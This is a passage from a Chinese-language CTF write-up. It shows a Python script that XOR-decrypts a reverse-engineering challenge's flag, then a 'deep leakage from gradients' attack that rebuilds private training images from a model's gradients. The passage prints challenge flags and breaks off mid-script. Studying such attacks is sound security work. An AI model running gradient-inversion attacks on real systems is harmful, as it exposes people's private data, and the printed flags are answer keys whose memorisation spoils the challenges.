class="number">0x57</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0xA8</span>, <span class="number">0x4E</span>, <span class="number">0x7D</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x5F</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0xCB</span>, <span class="number">0xA1</span>, <span class="number">0x68</span>, <span class="number">0x4D</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0xE2</span>, <span class="number">0x95</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x83</span>, <span class="number">0xAF</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0xA8</span>, <span class="number">0x7C</span>, <span class="number">0x4D</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x67</span>, <span class="number">0x45</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x93</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x55</span>, <span class="number">0xE2</span>, <span class="number">0xE8</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x70</span>,</span><br><span class="line">    <span class="number">0xC8</span>, <span class="number">0xED</span>, <span class="number">0x6F</span>, <span class="number">0x0D</span>, <span class="number">0x45</span>, <span class="number">0x99</span>, <span class="number">0xD5</span>, <span class="number">0x62</span>, <span class="number">0x42</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0x48</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x74</span>, <span class="number">0x4E</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0xCA</span>, <span class="number">0x7D</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x94</span>, <span class="number">0xC6</span>, <span class="number">0x86</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0xC2</span>, <span class="number">0x8F</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0xBE</span>, <span class="number">0x98</span>, <span class="number">0x66</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xBB</span>, <span class="number">0xA1</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0xB7</span>, <span class="number">0xAA</span>, <span class="number">0x72</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0xB3</span>, <span class="number">0xB3</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x9C</span>, <span class="number">0xAF</span>, <span class="number">0xBC</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC8</span>, <span class="number">0xAB</span>, <span class="number">0xC5</span>, <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0xA7</span>, <span class="number">0xCE</span>, <span class="number">0x8A</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">v11 = <span class="number">20250428</span>  <span class="comment">#传入的数值参数</span></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">5</span> * v11</span><br><span class="line">v4 = <span class="number">15</span> * v11</span><br><span class="line">v5 = <span class="number">20</span> * v11</span><br><span class="line">v6 = <span class="number">10</span> * v11</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">bytearray</span>(target_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x80</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">15</span> + <span class="number">4</span> &gt; <span class="built_in">len</span>(s1): </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor_dword</span>(<span class="params">offset, value</span>):</span><br><span class="line">        pos = i + offset</span><br><span class="line">        val = struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, s1, pos)[<span class="number">0</span>]  </span><br><span class="line">        val ^= value</span><br><span class="line">        struct.pack_into(<span class="string">&#x27;&lt;I&#x27;</span>, s1, pos, val)</span><br><span class="line"></span><br><span class="line">    xor_dword(<span class="number">0</span>, v2)</span><br><span class="line">    xor_dword(<span class="number">5</span>, v3 + v2)</span><br><span class="line">    xor_dword(<span class="number">10</span>, v6 + v2)</span><br><span class="line">    xor_dword(<span class="number">15</span>, v4 + v2)</span><br><span class="line"></span><br><span class="line">    v2 += v5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的字节数据：\n<span class="subst">&#123;s1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试以不同的编码解码</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = s1.rstrip(<span class="string">b&#x27;\x00&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 解密成功，flag/原文为：\n<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = s1.decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 使用 latin1 编码解密成功，flag/原文为：\n<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 解密失败，latin1 解码出错。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/image-20250504172338683.png" alt="image-20250504172338683"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;WHEN_yOUr_DReAMS_COME_AIivE_YoU&#x27;r3_Un5T0pp461E&#125;</span><br></pre></td></tr></table></figure>



<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="Gradient"><a href="#Gradient" class="headerlink" title="Gradient"></a>Gradient</h2><p>AI题先交给AI做，后面一定好好上创新实践训练课😭😭😭</p>
<p>特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。</p>
<p>根据题目，找到参考的论文以及源代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 核心代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deep_leakage_from_gradients</span>(<span class="params">model, origin_grad</span>): </span><br><span class="line">  dummy_data = torch.randn(origin_data.size())</span><br><span class="line">  dummy_label =  torch.randn(dummy_label.size())</span><br><span class="line">  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">      optimizer.zero_grad()</span><br><span class="line">      dummy_pred = model(dummy_data) </span><br><span class="line">      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-<span class="number">1</span>)) </span><br><span class="line">      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">      grad_diff = <span class="built_in">sum</span>(((dummy_grad - origin_grad) ** <span class="number">2</span>).<span class="built_in">sum</span>() \</span><br><span class="line">        <span class="keyword">for</span> dummy_g, origin_g <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_grad, origin_grad))</span><br><span class="line">      </span><br><span class="line">      grad_diff.backward()</span><br><span class="line">      <span class="keyword">return</span> grad_diff</span><br><span class="line">    </span><br><span class="line">    optimizer.step(closure)</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span>  dummy_data, dummy_label</span><br></pre></td></tr></table></figure>

<p>恢复的方法大意是指：</p>
<ul>
<li>先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label</li>
<li>用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近</li>
<li>然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss</li>
<li>计算dummy_data的梯度</li>
<li>衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。</li>
<li>最后返回输出和标签，还原原始样本。</li>
</ul>
<p>现有的文件是 model.pth 和一些 梯度文件 .grad</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="comment"># 占位模型类，用于加载（结构未知时也能绕过）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">R1ckNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入到 safe_globals（新 PyTorch 安全机制）</span></span><br><span class="line"><span class="keyword">from</span> torch.serialization <span class="keyword">import</span> add_safe_globals</span><br><span class="line">add_safe_globals(&#123;<span class="string">&#x27;R1ckNet&#x27;</span>: R1ckNet&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pthfile = <span class="string">r&#x27;E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth&#x27;</span>            <span class="comment">#.pth文件的路径</span></span><br><span class="line">model = torch.load(pthfile, map_location=<span class="string">&#x27;cpu&#x27;</span>, weights_only=<span class="literal">False</span>)</span><br><span class="line">state_dict = model.state_dict()   <span class="comment"># 从模型对象中提取参数字典</span></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> state_dict.items():</span><br><span class="line">    <span class="built_in">print</span>(k, v.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。</span></span><br><span class="line"><span class="comment">#所以实例化一个类占位。</span></span><br></pre></td></tr></table></figure>

<p>通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。</p>
<ul>
<li>卷积层权重：卷积核数量、输入通道数、卷积核大小。</li>
<li>全连接层权重：输入与输出之间的连接。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出如下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">body.0.weight torch.Size([12, 3, 5, 5])</span></span><br><span class="line"><span class="string">body.0.bias torch.Size([12])</span></span><br><span class="line"><span class="string">body.2.weight torch.Size([12, 12, 5, 5])</span></span><br><span class="line"><span class="string">body.2.bias torch.Size([12])</span></span><br><span class="line"><span class="string">body.4.weight torch.Size([12, 12, 5, 5])</span></span><br><span class="line"><span class="string">body.4.bias torch.Size([12])</span></span><br><span class="line"><span class="string">body.6.weight torch.Size([16, 12, 3, 3])</span></span><br><span class="line"><span class="string">body.6.bias torch.Size([16])</span></span><br><span class="line"><span class="string">fc.0.weight torch.Size([100, 1024])</span></span><br><span class="line"><span class="string">fc.0.bias torch.Size([100])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你的模型类定义在某个模块里，请确保能 import 到它</span></span><br><span class="line"><span class="comment"># 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">R1ckNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_channels=<span class="number">3</span>, conv1_out=<span class="number">12</span>, conv2_out=<span class="number">12</span>, conv3_out=<span class="number">12</span>, conv4_out=<span class="number">16</span>, fc_in=<span class="number">1024</span>, num_classes=<span class="number">100</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># 如果模型里定义了 hparams，它会在实例上</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.hparams = &#123;</span><br><span class="line">                <span class="string">&quot;in_channels&quot;</span>: in_channels,</span><br><span class="line">                <span class="string">&quot;conv1_out&quot;</span>: conv1_out,</span><br><span class="line">                <span class="string">&quot;conv2_out&quot;</span>: conv2_out,</span><br><span class="line">                <span class="string">&quot;conv3_out&quot;</span>: conv3_out,</span><br><span class="line">                <span class="string">&quot;conv4_out&quot;</span>: conv4_out,</span><br><span class="line">                <span class="string">&quot;fc_in&quot;</span>: fc_in,</span><br><span class="line">                <span class="string">&quot;num_classes&quot;</span>: num_classes,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># 构建网络结构（可省略，仅为完整定义）</span></span><br><span class="line">        <span class="variable language_">self</span>.body = nn.Sequential(</span><br><span class="line">            nn.Conv2d(in_channels, conv1_out, <span class="number">5</span>, stride=<span class="number">2</span>, padding=<span class="number">2</span>), nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv1_out, conv2_out, <span class="number">5</span>, stride=<span class="number">2</span>, padding=<span class="number">2</span>), nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv2_out, conv3_out, <span class="number">5</span>, stride=<span class="number">1</span>, padding=<span class="number">2</span>), nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv3_out, conv4_out, <span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>), nn.Sigmoid(),</span><br><span class="line">            nn.Flatten()</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.body(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.fc(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 尝试打印 hparams，否则退回默认</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;hparams&#x27;</span>):</span><br><span class="line">            params = <span class="string">&quot;, &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v&#125;</span>&quot;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="variable language_">self</span>.hparams.items())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.__class__.__name__&#125;</span>(<span class="subst">&#123;params&#125;</span>)&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>().__repr__()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--pth&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;path to .pth file (whole-model or state_dict)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 载入 .pth</span></span><br><span class="line">    loaded = torch.load(args.pth, map_location=<span class="string">&#x27;cpu&#x27;</span>,weights_only=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判定类型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(loaded, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Detected state_dict. Instantiating R1ckNet and loading state_dict.&quot;</span>)</span><br><span class="line">        model = R1ckNet()</span><br><span class="line">        <span class="comment"># 支持 checkpoint dict 包含 &#x27;model_state_dict&#x27;</span></span><br><span class="line">        sd = loaded.get(<span class="string">&#x27;model_state_dict&#x27;</span>, loaded)</span><br><span class="line">        model.load_state_dict(sd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Detected full-model object. Using it directly.&quot;</span>)</span><br><span class="line">        model = loaded</span><br><span class="line"></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) 打印 repr（调用 __repr__）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== Model repr() ===&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) 打印构造函数签名</span></span><br><span class="line">    sig = inspect.signature(model.__class__.__init__)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== Constructor signature ===&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sig)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) 如果有 hparams</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(model, <span class="string">&#x27;hparams&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== model.hparams ===&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> model.hparams.items():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;k&#125;</span> = <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">vars</span>(model).items():</span><br><span class="line">            <span class="comment"># 过滤模块和参数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(v, (nn.Module, nn.Parameter)) <span class="keyword">and</span> <span class="keyword">not</span> k.startswith(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;k&#125;</span> = <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) 列出所有参数名和形状</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== model.named_parameters() ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name, param <span class="keyword">in</span> model.named_parameters():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name:30s&#125;</span> | shape: <span class="subst">&#123;<span class="built_in">tuple</span>(param.shape)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># cmd line: python info.py --pth &quot;your.pth&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/image-20250504203337339.png" alt="image-20250504203337339"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝</span><br><span class="line">字符背景是白色的。</span><br></pre></td></tr></table></figure>

<p>那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># r1cknet_grad_attack.py</span></span><br><span class="line"><span class="comment"># 单独训练某个样本</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> R1ckNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> label_to_onehot, cross_entropy_for_onehot</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Deep Leakage from Gradients using R1ckNet.&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--grad&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Path to the .grad file&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--out&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;Path to save recovered image&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Running on&quot;</span>, device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 加载原始梯度</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(args.grad, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    origin_grad = torch.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 初始化模型并加载已有权重</span></span><br><span class="line"><span class="comment">#net = R1ckNet().to(device)</span></span><br><span class="line"><span class="comment">#这个也可以不用注释掉，就是和后面导入模型有点重复</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型的state_dict</span></span><br><span class="line">net = torch.load(<span class="string">r&quot;E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth&quot;</span>, </span><br><span class="line">                 map_location=device,weights_only=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">net.<span class="built_in">eval</span>()</span><br><span 